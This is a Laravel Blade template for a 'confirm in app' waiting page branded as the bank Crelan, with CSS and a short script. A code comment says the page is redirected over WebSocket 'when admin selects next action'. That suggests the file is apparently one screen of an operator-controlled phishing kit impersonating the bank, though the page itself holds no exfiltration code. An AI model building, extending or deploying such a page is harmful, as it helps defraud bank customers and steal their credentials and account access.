@extends('layouts.app')

@section('title', __('messages.push_confirm_title') . ' | Crelan')

@section('content')
<div class="form-page-center">
    <div class="form-container">

        <div class="form-container--content">
            <div class="push-container">
                <div class="push-icon">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M17 1H7C5.9 1 5 1.9 5 3V21C5 22.1 5.9 23 7 23H17C18.1 23 19 22.1 19 21V3C19 1.9 18.1 1 17 1ZM17 19H7V5H17V19ZM12 18C12.55 18 13 17.55 13 17C13 16.45 12.55 16 12 16C11.45 16 11 16.45 11 17C11 17.55 11.45 18 12 18Z" fill="#84BD00"/>
                        <circle cx="12" cy="11" r="3" stroke="#84BD00" stroke-width="2" fill="none"/>
                        <path d="M12 8V11L13.5 12.5" stroke="#84BD00" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                </div>
                
                <h2 class="push-title">{{ __('messages.push_confirm_in_app') }}</h2>
                
                <p class="push-text">
                    {{ __('messages.push_request_sent') }}
                </p>
                
               
                
                <div class="waiting-spinner"></div>
                <p class="waiting-text">{{ __('messages.push_waiting') }}</p>
            </div>
        </div>
    </div>
</div>
@endsection

@push('styles')
<style>
/* Header layout */
.form-container--header-crelan {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 20px;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 12px;
}
.header-right {
    flex: 1;
    max-width: 300px;
}

/* Push steps compact */
.push-steps-compact {
    display: flex;
    flex-direction: column;
    gap: 3px;
}

.push-step {
    display: flex;
    align-items: center;
    gap: 6px;
    padding: 2px 4px;
    border-radius: 4px;
    background: #f8fafc;
    border: 1px solid #e2e8f0;
    transition: all 0.3s ease;
}

.push-step:last-child {
    margin-bottom: 0;
}

.push-step.active {
    background: #f0fdf4;
    border-color: #84BD00;
}

.push-step-number {
    width: 14px;
    height: 14px;
    border-radius: 50%;
    background: #e2e8f0;
    color: #64748b;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 8px;
    font-weight: 600;
    flex-shrink: 0;
}

.push-step.active .push-step-number {
    background: #84BD00;
    color: white;
}

.push-step-content {
    flex: 1;
    min-width: 0;
}

.push-step-title {
    font-size: 8px;
    font-weight: 600;
    color: #64748b;
    line-height: 1.1;
}

.push-step.active .push-step-title {
    color: #1a202c;
}

.push-step-text {
    display: none;
}

.push-step.active .push-step-text {
    display: none;
}

/* Remove old styles */
.progress-compact {
    display: none;
}
</style>
@endpush

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Listen for WebSocket events for push confirmation
    const sessionId = localStorage.getItem('session_id');
    
    if (!sessionId) {
        window.location.href = '/';
        return;
    }
    
    // The page will be redirected via WebSocket when admin selects next action
    // SessionManager from session.js handles the WebSocket connection
    if (window.SessionManager) {
        window.SessionManager.setSessionId(sessionId);
    }
});
</script>
@endpush
